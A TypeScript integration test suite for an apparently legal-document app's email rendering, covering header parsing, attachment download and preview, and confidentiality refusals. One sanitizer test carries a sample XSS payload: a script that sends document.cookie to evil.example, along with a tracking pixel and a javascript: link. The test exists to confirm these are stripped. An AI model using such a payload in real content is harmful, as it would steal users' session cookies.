// SPDX-License-Identifier: AGPL-3.0-only

/**
 * Rendered emails (M12/5, DOC-004) at the HTTP seam.
 *
 * **The demand is one sentence.** A Legal Team Member uploads the
 * message a deal was argued in and reads it on the record — headers,
 * body, attachment list — rather than downloading a blob and opening
 * Outlook.
 *
 * **Nothing here reaches into the parser.** A suite uploads a real EML
 * and a real MSG over HTTP and then reads the same addresses the doc
 * panel reads. The unit-level questions — what a MIME tree yields, what
 * a sanitizer strips — are answered in `lib/email/parse.test.ts`; what
 * is answered here is what a client can see.
 *
 * **The body is sanitized before it leaves the API.** An email is the
 * one thing in this system written by somebody outside it, so the case
 * that matters is a message carrying a script and a tracking pixel, read
 * back over HTTP with neither in it.
 *
 * **The body is the version's text** (DOC-005). It lands in the same
 * table, through the same states, and answers a source of its own —
 * `email_body`, which is neither a PDF's own layer nor a machine's
 * reading of a photograph.
 *
 * **An attachment is not a side door.** Every access case is asserted on
 * the attachment addresses as well as on the email read, because that is
 * the whole risk this feature adds: a file inside a file, reachable
 * without passing the two predicates its version passes.
 *
 * Refusals are written the M10 way: every one is sent twice, once at the
 * real address and once at an id nothing was ever created under, and the
 * two problem bodies must be one body.
 */

import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { eq, users } from "@openlaw/db";
import { provisionUser } from "../../auth/instance.js";
import { emlFixture, msgFixture, type EmailFixture } from "../../testing/fixtures/email.js";
import {
  signInCookies,
  startHarness,
  TEST_ADMIN as ADMIN,
  type TestHarness,
} from "../../testing/harness.js";

/** A Legal Team Member on the contract's team, who uploads everything
 * here and reads it back. */
const MEMBER = {
  email: "docmail-member@example.com",
  displayName: "Nadia Counsel",
  password: "correct-horse-battery", // NOSONAR — fixture for a throwaway container
} as const;
/** A Contributor on the team: read access means reading, on every
 * surface (DD-015, CTR-021). */
const CONTRIBUTOR = {
  email: "docmail-contributor@example.com",
  displayName: "Casey Contributor",
  password: "correct-horse-battery", // NOSONAR — fixture for a throwaway container
} as const;
/** A Legal Team Member with no team row. They read every open contract,
 * and nothing of a confidential one — nor of a confidential document on
 * an open one. */
const OUTSIDER = {
  email: "docmail-outsider@example.com",
  displayName: "Otto Outsider",
  password: "correct-horse-battery", // NOSONAR — fixture for a throwaway container
} as const;

let harness: TestHarness;
let adminCookies: Record<string, string>;
let memberCookies: Record<string, string>;
let contributorCookies: Record<string, string>;
let outsiderCookies: Record<string, string>;
const userIds = new Map<string, string>();

const idOf = (fixture: { email: string }): string => {
  const id = userIds.get(fixture.email);
  expect(id, fixture.email).toBeDefined();
  return id!;
};

interface ContractRow {
  id: string;
  number: number;
}

interface VersionRow {
  id: string;
  versionNumber: number;
  originalFilename: string;
  renderFamily: string;
  isCurrent: boolean;
}

interface DocumentRow {
  id: string;
  title: string;
  versions: VersionRow[];
}

/** What the extracted-text read answers. */
interface TextRow {
  state: "pending" | "ready" | "failed" | "unsupported";
  source: "native_layer" | "ocr" | "rendition" | "email_body" | null;
  text: string | null;
  updatedAt: string | null;
}

/** What the email read answers. */
interface EmailRow {
  subject: string | null;
  from: { name: string | null; address: string | null } | null;
  to: { name: string | null; address: string | null }[];
  cc: { name: string | null; address: string | null }[];
  bcc: { name: string | null; address: string | null }[];
  date: string | null;
  html: string | null;
  text: string | null;
  attachments: {
    index: number;
    filename: string;
    mimeType: string;
    byteSize: number;
    renderFamily: string;
    isInline: boolean;
  }[];
}

/** An id nothing was ever created under — the control every refusal is
 * compared against. */
const NEVER_CREATED = "0198f2ab-0000-7000-8000-0000000045de";

/** The declared type a browser sends for each container. */
const EML = "message/rfc822";
const MSG = "application/vnd.ms-outlook";

/** The two containers, driven from one table: an EML and a MSG carrying
 * the same message must read the same way at this seam. */
const CONTAINERS = [
  { label: "EML", build: emlFixture, contentType: EML, extension: "eml" },
  { label: "MSG", build: msgFixture, contentType: MSG, extension: "msg" },
] as const;

beforeAll(async () => {
  harness = await startHarness();
  const setup = await harness.app.inject({
    method: "POST",
    url: "/api/v1/auth/setup",
    payload: ADMIN,
  });
  expect(setup.statusCode, setup.body).toBe(201);
  const [admin] = await harness.db
    .select({ id: users.id })
    .from(users)
    .where(eq(users.email, ADMIN.email));
  userIds.set(ADMIN.email, admin!.id);

  for (const [fixture, role] of [
    [MEMBER, "legal_team_member"],
    [OUTSIDER, "legal_team_member"],
    [CONTRIBUTOR, "contributor"],
  ] as const) {
    const user = await provisionUser(harness.app.auth, fixture);
    await harness.db.update(users).set({ role }).where(eq(users.id, user.id));
    userIds.set(fixture.email, user.id);
  }
  adminCookies = await signInCookies(harness.app, ADMIN.email, ADMIN.password);
  memberCookies = await signInCookies(harness.app, MEMBER.email, MEMBER.password);
  contributorCookies = await signInCookies(harness.app, CONTRIBUTOR.email, CONTRIBUTOR.password);
  outsiderCookies = await signInCookies(harness.app, OUTSIDER.email, OUTSIDER.password);
}, 120_000);

afterAll(async () => {
  await harness.stop();
});

/** The `nda` seed type, which every contract here is created as. */
async function ndaTypeId(): Promise<string> {
  const res = await harness.app.inject({
    method: "GET",
    url: "/api/v1/contracts/options",
    cookies: adminCookies,
  });
  expect(res.statusCode, res.body).toBe(200);
  const nda = (res.json().contractTypes as { id: string; slug: string }[]).find(
    (row) => row.slug === "nda",
  );
  expect(nda, "the nda seed type").toBeDefined();
  return nda!.id;
}

/** A contract with the Member and the Contributor on its team. */
async function newContract(title: string): Promise<ContractRow> {
  const res = await harness.app.inject({
    method: "POST",
    url: "/api/v1/contracts",
    cookies: adminCookies,
    payload: { title, contractTypeId: await ndaTypeId() },
  });
  expect(res.statusCode, res.body).toBe(201);
  const contract = res.json().contract as ContractRow;
  await putOnTeam(contract.number, idOf(MEMBER), "member");
  await putOnTeam(contract.number, idOf(CONTRIBUTOR), "contributor");
  return contract;
}

async function putOnTeam(number: number, userId: string, role: string): Promise<void> {
  const res = await harness.app.inject({
    method: "POST",
    url: `/api/v1/contracts/${number}/team`,
    cookies: adminCookies,
    payload: { userId, role },
  });
  expect(res.statusCode, res.body).toBe(201);
}

/** Walls the whole contract off (M10's flag). */
async function markContractConfidential(number: number): Promise<void> {
  const res = await harness.app.inject({
    method: "PATCH",
    url: `/api/v1/contracts/${number}`,
    cookies: adminCookies,
    payload: { isConfidential: true },
  });
  expect(res.statusCode, res.body).toBe(200);
}

/** Walls one document off (DD-014's per-document flag). */
async function markDocumentConfidential(documentId: string): Promise<void> {
  const res = await harness.app.inject({
    method: "PATCH",
    url: `/api/v1/documents/${documentId}`,
    cookies: adminCookies,
    payload: { isConfidential: true },
  });
  expect(res.statusCode, res.body).toBe(200);
}

const BOUNDARY = "openlaw-test-boundary-656d61696c";

/** What one upload declares about itself: a name, a type, and bytes. */
interface FileSpec {
  filename: string;
  contentType: string;
  content: Buffer;
}

function uploadBody(file: FileSpec): { payload: Buffer; headers: Record<string, string> } {
  const payload = Buffer.concat([
    Buffer.from(`--${BOUNDARY}\r\n`),
    Buffer.from('content-disposition: form-data; name="kind"\r\n\r\ndraft_ours\r\n'),
    Buffer.from(`--${BOUNDARY}\r\n`),
    Buffer.from(
      `content-disposition: form-data; name="file"; filename="${file.filename}"\r\n` +
        `content-type: ${file.contentType}\r\n\r\n`,
    ),
    file.content,
    Buffer.from("\r\n"),
    Buffer.from(`--${BOUNDARY}--\r\n`),
  ]);
  return { payload, headers: { "content-type": `multipart/form-data; boundary=${BOUNDARY}` } };
}

/** Uploads one document to a contract, requiring success. */
async function uploaded(number: number, file: FileSpec): Promise<DocumentRow> {
  const { payload, headers } = uploadBody(file);
  const res = await harness.app.inject({
    method: "POST",
    url: `/api/v1/contracts/${number}/documents`,
    cookies: memberCookies,
    headers,
    payload,
  });
  expect(res.statusCode, res.body).toBe(201);
  return res.json().document as DocumentRow;
}

const currentOf = (document: DocumentRow): VersionRow => {
  const current = document.versions.filter((version) => version.isCurrent);
  expect(current.length, "exactly one current version").toBe(1);
  return current[0]!;
};

/** `instance` is the URL the client itself asked for, so it is the one
 * field two refusals at two addresses are allowed to differ in. */
const withoutInstance = (body: Record<string, unknown>) => ({ ...body, instance: undefined });

const readEmail = (cookies: Record<string, string>, documentId: string, versionId: string) =>
  harness.app.inject({
    method: "GET",
    url: `/api/v1/documents/${documentId}/versions/${versionId}/email`,
    cookies,
  });

const downloadAttachment = (
  cookies: Record<string, string>,
  documentId: string,
  versionId: string,
  index: number,
) =>
  harness.app.inject({
    method: "GET",
    url: `/api/v1/documents/${documentId}/versions/${versionId}/attachments/${index}/download`,
    cookies,
  });

const previewAttachment = (
  cookies: Record<string, string>,
  documentId: string,
  versionId: string,
  index: number,
) =>
  harness.app.inject({
    method: "GET",
    url: `/api/v1/documents/${documentId}/versions/${versionId}/attachments/${index}/preview`,
    cookies,
  });

const readText = (cookies: Record<string, string>, documentId: string, versionId: string) =>
  harness.app.inject({
    method: "GET",
    url: `/api/v1/documents/${documentId}/versions/${versionId}/text`,
    cookies,
  });

/** How long an extraction is given before the suite calls it stuck. The
 * parse is in process, so this is slack for the queue, not for the
 * work. */
const SETTLE_TIMEOUT_MS = 20_000;

/** Polls the extracted-text read the way a client does, until the
 * derivation stops being owed. */
async function settledText(documentId: string, versionId: string): Promise<TextRow> {
  const deadline = Date.now() + SETTLE_TIMEOUT_MS;
  let last: TextRow | undefined;
  while (Date.now() < deadline) {
    const res = await readText(memberCookies, documentId, versionId);
    expect(res.statusCode, res.body).toBe(200);
    last = res.json().text as TextRow;
    if (last.state !== "pending") return last;
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error(
    `the text for version ${versionId} was still pending after ${SETTLE_TIMEOUT_MS}ms: ` +
      `${JSON.stringify(last)}\n${JSON.stringify(harness.jobLog, null, 2)}`,
  );
}

/** A one-document contract whose only file is `file`. */
async function contractWithFile(title: string, file: FileSpec) {
  const contract = await newContract(title);
  const document = await uploaded(contract.number, file);
  return { contract, document, version: currentOf(document) };
}

/** The message every "it reads like an email" case uses, told in
 * whichever container the case is for. */
const NEGOTIATION: EmailFixture = {
  subject: "Re: Orion MSA — round three",
  from: { name: "Nadia Counsel", address: "nadia@example.com" },
  to: [{ name: "Otto Outsider", address: "otto@example.com" }],
  cc: [{ address: "legal@example.com" }],
  text: "Round three is attached. The indemnity cap is the last open point.",
  attachments: [
    {
      filename: "round-three.pdf",
      mimeType: "application/pdf",
      content: Buffer.from("%PDF-1.4 round three"),
    },
  ],
};

for (const container of CONTAINERS) {
  const emailFile = (email: EmailFixture, name = `thread.${container.extension}`): FileSpec => ({
    filename: name,
    contentType: container.contentType,
    content: container.build(email),
  });

  describe(`an uploaded ${container.label} (M12/5)`, () => {
    it("reads as headers, a body, and an attachment list", async () => {
      const { document, version } = await contractWithFile(
        `${container.label} — negotiation thread`,
        emailFile(NEGOTIATION),
      );

      // The family the panel switches on, routed on the server.
      expect(version.renderFamily).toBe("email");

      const res = await readEmail(memberCookies, document.id, version.id);
      expect(res.statusCode, res.body).toBe(200);
      const email = res.json().email as EmailRow;

      expect(email.subject).toBe("Re: Orion MSA — round three");
      expect(email.from).toEqual({ name: "Nadia Counsel", address: "nadia@example.com" });
      expect(email.to.map((address) => address.address)).toEqual(["otto@example.com"]);
      expect(email.cc.map((address) => address.address)).toEqual(["legal@example.com"]);
      expect(email.text).toContain("The indemnity cap is the last open point.");
      expect(email.attachments).toEqual([
        {
          index: 0,
          filename: "round-three.pdf",
          mimeType: "application/pdf",
          byteSize: "%PDF-1.4 round three".length,
          // The one fact that decides whether opening this file keeps a
          // reader in the app.
          renderFamily: "pdf",
          isInline: false,
        },
      ]);
    });

    it("hands out a sanitized body and never the sender's own markup", async () => {
      const { document, version } = await contractWithFile(
        `${container.label} — hostile body`,
        emailFile({
          from: { address: "stranger@example.com" },
          html:
            "<p>Please sign the <b>attached</b>.</p>" +
            "<script>fetch('https://evil.example/' + document.cookie)</script>" +
            '<img src="https://tracker.example/opened.gif">' +
            '<a href="javascript:alert(1)">click</a>',
        }),
      );

      const res = await readEmail(memberCookies, document.id, version.id);
      expect(res.statusCode, res.body).toBe(200);
      const email = res.json().email as EmailRow;

      // What the reader came for.
      expect(email.html).toContain("<b>attached</b>");
      // What could run, or report that a disclosed email was opened.
      expect(email.html).not.toContain("<script");
      expect(email.html).not.toContain("document.cookie");
      expect(email.html).not.toContain("tracker.example");
      expect(email.html).not.toContain("javascript:");
    });

    it("stores the body as the version's extracted text", async () => {
      const { document, version } = await contractWithFile(
        `${container.label} — text extraction`,
        emailFile(NEGOTIATION),
      );

      const text = await settledText(document.id, version.id);

      // The same table and the same states the PDF path uses, and a
      // source of its own: an email body is neither a PDF's own layer
      // nor a machine's reading of a photograph.
      expect(text.state).toBe("ready");
      expect(text.source).toBe("email_body");
      expect(text.text).toContain("The indemnity cap is the last open point.");
      expect(text.updatedAt).not.toBeNull();
    });

    it("downloads an attachment, without repeating what the message said it was", async () => {
      const { document, version } = await contractWithFile(
        `${container.label} — attachment download`,
        emailFile(NEGOTIATION),
      );

      const res = await downloadAttachment(memberCookies, document.id, version.id, 0);

      expect(res.statusCode, res.body).toBe(200);
      expect(res.rawPayload.toString()).toBe("%PDF-1.4 round three");
      // The declared type came out of the middle of a file nobody
      // checked, so it is not echoed back at a browser.
      expect(res.headers["content-type"]).toBe("application/octet-stream");
      expect(res.headers["content-disposition"]).toContain('filename="round-three.pdf"');
      expect(res.headers["x-content-type-options"]).toBe("nosniff");
    });

    it("previews a renderable attachment in place, under a type this server chose", async () => {
      const { document, version } = await contractWithFile(
        `${container.label} — attachment preview`,
        emailFile(NEGOTIATION),
      );

      const res = await previewAttachment(memberCookies, document.id, version.id, 0);

      expect(res.statusCode, res.body).toBe(200);
      expect(res.rawPayload.toString()).toBe("%PDF-1.4 round three");
      expect(res.headers["content-type"]).toBe("application/pdf");
      expect(res.headers["content-disposition"]).toContain("inline");
      expect(res.headers["x-content-type-options"]).toBe("nosniff");
      expect(res.headers["content-security-policy"]).toBe("default-src 'none'; sandbox");
    });

    it("refuses to preview an attachment outside the render set, and offers the download", async () => {
      const { document, version } = await contractWithFile(
        `${container.label} — spreadsheet attached`,
        emailFile({
          from: { address: "stranger@example.com" },
          text: "Numbers attached.",
          attachments: [
            {
              filename: "fee-schedule.xlsx",
              mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
              content: Buffer.from("PK spreadsheet"),
            },
          ],
        }),
      );

      const listed = await readEmail(memberCookies, document.id, version.id);
      expect((listed.json().email as EmailRow).attachments[0]?.renderFamily).toBe("other");

      const preview = await previewAttachment(memberCookies, document.id, version.id, 0);
      // Plainly, not as a 404: the reader was handed this attachment's
      // row, so hiding here would hide nothing.
      expect(preview.statusCode, preview.body).toBe(415);

      const download = await downloadAttachment(memberCookies, document.id, version.id, 0);
      expect(download.statusCode, download.body).toBe(200);
      expect(download.rawPayload.toString()).toBe("PK spreadsheet");
    });

    it("lets a Contributor on the team read what they may download", async () => {
      const { document, version } = await contractWithFile(
        `${container.label} — contributor reads`,
        emailFile(NEGOTIATION),
      );

      // Read access means reading, on every surface (DD-015, CTR-021).
      expect((await readEmail(contributorCookies, document.id, version.id)).statusCode).toBe(200);
      expect(
        (await downloadAttachment(contributorCookies, document.id, version.id, 0)).statusCode,
      ).toBe(200);
      expect(
        (await previewAttachment(contributorCookies, document.id, version.id, 0)).statusCode,
      ).toBe(200);
    });
  });
}

describe("what an email read refuses (M12/5)", () => {
  it("refuses a file that is not an email, plainly", async () => {
    const { document, version } = await contractWithFile("A PDF, not an email", {
      filename: "agreement.pdf",
      contentType: "application/pdf",
      content: Buffer.from("%PDF-1.4 an agreement"),
    });

    const res = await readEmail(memberCookies, document.id, version.id);

    // Not a 404. The reader can already see the document — telling them
    // a PDF is not an email hides nothing and makes an honest answer
    // read as an answer rather than as a bug.
    expect(res.statusCode, res.body).toBe(415);
  });

  it("refuses bytes that cannot be read as the email they claim to be", async () => {
    const { document, version } = await contractWithFile("A misnamed text file", {
      filename: "notes.msg",
      contentType: MSG,
      content: Buffer.from("these are not the bytes of an Outlook message"),
    });

    const res = await readEmail(memberCookies, document.id, version.id);

    expect(res.statusCode, res.body).toBe(422);
    // The download is what is offered instead, and it still works: a
    // parse that failed never touches the stored file.
    const download = await harness.app.inject({
      method: "GET",
      url: `/api/v1/documents/${document.id}/versions/${version.id}/download`,
      cookies: memberCookies,
    });
    expect(download.statusCode, download.body).toBe(200);
  });

  it("marks the text of an unreadable email failed, rather than leaving it pending", async () => {
    const { document, version } = await contractWithFile("An unreadable message", {
      filename: "broken.msg",
      contentType: MSG,
      content: Buffer.from("these are not the bytes of an Outlook message"),
    });

    const text = await settledText(document.id, version.id);

    // A caller polling for words that are never coming deserves an
    // answer. The bytes are what they are, so no retry changes it.
    expect(text.state).toBe("failed");
    expect(text.text).toBeNull();
  });

  it("refuses the one attachment a damaged container cannot give up, and no other", async () => {
    const { document, version } = await contractWithFile("A message with a damaged file", {
      filename: "damaged.msg",
      contentType: MSG,
      content: msgFixture({
        from: { address: "sender@example.com" },
        text: "Both files attached.",
        attachments: [
          {
            filename: "damaged.pdf",
            mimeType: "application/pdf",
            content: Buffer.alloc(0),
            omitContent: true,
          },
          {
            filename: "whole.pdf",
            mimeType: "application/pdf",
            content: Buffer.from("%PDF-1.4 whole"),
          },
        ],
      }),
    });

    // The message still reads, and the damaged entry is kept at its own
    // position — dropping it would repoint every later attachment's
    // address at another file.
    const listed = await readEmail(memberCookies, document.id, version.id);
    expect(listed.statusCode, listed.body).toBe(200);
    const email = listed.json().email as EmailRow;
    expect(email.text).toBe("Both files attached.");
    expect(email.attachments.map((a) => a.filename)).toEqual(["damaged.pdf", "whole.pdf"]);

    // The entry that cannot be served says so — the same fact as an
    // unreadable email, one file down — and its neighbour still streams
    // from the address the list gave it.
    expect((await downloadAttachment(memberCookies, document.id, version.id, 0)).statusCode).toBe(
      422,
    );
    expect((await previewAttachment(memberCookies, document.id, version.id, 0)).statusCode).toBe(
      422,
    );
    const whole = await downloadAttachment(memberCookies, document.id, version.id, 1);
    expect(whole.statusCode, whole.body).toBe(200);
    expect(whole.rawPayload.toString()).toBe("%PDF-1.4 whole");
  });

  it("answers no attachment at a position the message has none at", async () => {
    const { document, version } = await contractWithFile("A message with one attachment", {
      filename: "one.eml",
      contentType: EML,
      content: emlFixture(NEGOTIATION),
    });

    expect((await downloadAttachment(memberCookies, document.id, version.id, 7)).statusCode).toBe(
      404,
    );
    expect((await previewAttachment(memberCookies, document.id, version.id, 7)).statusCode).toBe(
      404,
    );
  });

  it("refuses a position past the bound before it reads the file", async () => {
    const { document, version } = await contractWithFile("A bounded message", {
      filename: "bounded.eml",
      contentType: EML,
      content: emlFixture(NEGOTIATION),
    });

    // The schema's own refusal, not the handler's. A position this far
    // into a message names no attachment on any of them, and answering it
    // would cost a blob read and a parse before the list could say so.
    const res = await downloadAttachment(memberCookies, document.id, version.id, 1_000_001);

    expect(res.statusCode, res.body).toBe(400);
  });
});

describe("email rendering opens no side door (M12/5, DOC-008, DD-014)", () => {
  it("answers a viewer who cannot reach the contract exactly as for a document that does not exist", async () => {
    const contract = await newContract("A confidential negotiation");
    const document = await uploaded(contract.number, {
      filename: "thread.eml",
      contentType: EML,
      content: emlFixture(NEGOTIATION),
    });
    const version = currentOf(document);
    await markContractConfidential(contract.number);

    for (const [label, ask] of [
      ["the email read", readEmail],
      [
        "the attachment download",
        (c: Record<string, string>, d: string, v: string) => downloadAttachment(c, d, v, 0),
      ],
      [
        "the attachment preview",
        (c: Record<string, string>, d: string, v: string) => previewAttachment(c, d, v, 0),
      ],
    ] as const) {
      const refused = await ask(outsiderCookies, document.id, version.id);
      const control = await ask(outsiderCookies, NEVER_CREATED, NEVER_CREATED);
      expect(refused.statusCode, `${label}: ${refused.body}`).toBe(404);
      expect(control.statusCode, `${label}: ${control.body}`).toBe(404);
      // One body, or the refusal is a statement that the file is there.
      expect(withoutInstance(refused.json()), label).toEqual(withoutInstance(control.json()));
    }
  });

  it("answers a viewer outside a confidential document's audience the same way", async () => {
    const contract = await newContract("An open contract with one sealed message");
    const document = await uploaded(contract.number, {
      filename: "thread.eml",
      contentType: EML,
      content: emlFixture(NEGOTIATION),
    });
    const version = currentOf(document);
    await markDocumentConfidential(document.id);

    for (const [label, ask] of [
      ["the email read", readEmail],
      [
        "the attachment download",
        (c: Record<string, string>, d: string, v: string) => downloadAttachment(c, d, v, 0),
      ],
      [
        "the attachment preview",
        (c: Record<string, string>, d: string, v: string) => previewAttachment(c, d, v, 0),
      ],
    ] as const) {
      const refused = await ask(outsiderCookies, document.id, version.id);
      const control = await ask(outsiderCookies, NEVER_CREATED, NEVER_CREATED);
      expect(refused.statusCode, `${label}: ${refused.body}`).toBe(404);
      expect(withoutInstance(refused.json()), label).toEqual(withoutInstance(control.json()));
    }

    // And the audience itself still reads it, so the flag narrowed the
    // audience rather than closing the surface.
    expect((await readEmail(memberCookies, document.id, version.id)).statusCode).toBe(200);
  });

  it("refuses an attachment of a version on another document", async () => {
    const first = await contractWithFile("A thread on one record", {
      filename: "thread.eml",
      contentType: EML,
      content: emlFixture(NEGOTIATION),
    });
    const second = await contractWithFile("A thread on another", {
      filename: "thread.eml",
      contentType: EML,
      content: emlFixture(NEGOTIATION),
    });

    // The version id is real and the document id is real, and they do
    // not belong together — which is the same answer as neither being
    // there at all, on every one of the three new surfaces.
    for (const [label, ask] of [
      ["the email read", readEmail],
      [
        "the attachment download",
        (c: Record<string, string>, d: string, v: string) => downloadAttachment(c, d, v, 0),
      ],
      [
        "the attachment preview",
        (c: Record<string, string>, d: string, v: string) => previewAttachment(c, d, v, 0),
      ],
    ] as const) {
      const res = await ask(memberCookies, first.document.id, second.version.id);
      expect(res.statusCode, `${label}: ${res.body}`).toBe(404);
    }
  });
});
